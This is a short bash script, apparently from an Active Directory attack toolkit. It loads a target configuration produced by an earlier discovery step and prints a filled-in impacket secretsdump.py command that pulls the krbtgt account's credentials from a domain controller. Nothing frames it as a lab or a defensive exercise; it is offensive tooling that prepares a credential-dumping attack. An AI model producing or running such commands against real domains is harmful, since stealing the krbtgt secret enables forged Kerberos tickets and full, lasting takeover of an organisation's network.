#!/bin/bash

# Load the configuration
if [ ! -f "ad_target.conf" ]; then
    echo -e "${RED}[!] Configuration file not found. Run discovery first.${NC}"
    exit 1
fi

source ad_target.conf

# Generate the command with variables
echo -e "${GREEN}[+] Generated command:${NC}"
echo "secretsdump.py ${DOMAIN}/${USERNAME}@${DC_IP} -just-dc-user ${DOMAIN_SHORT}/krbtgt"
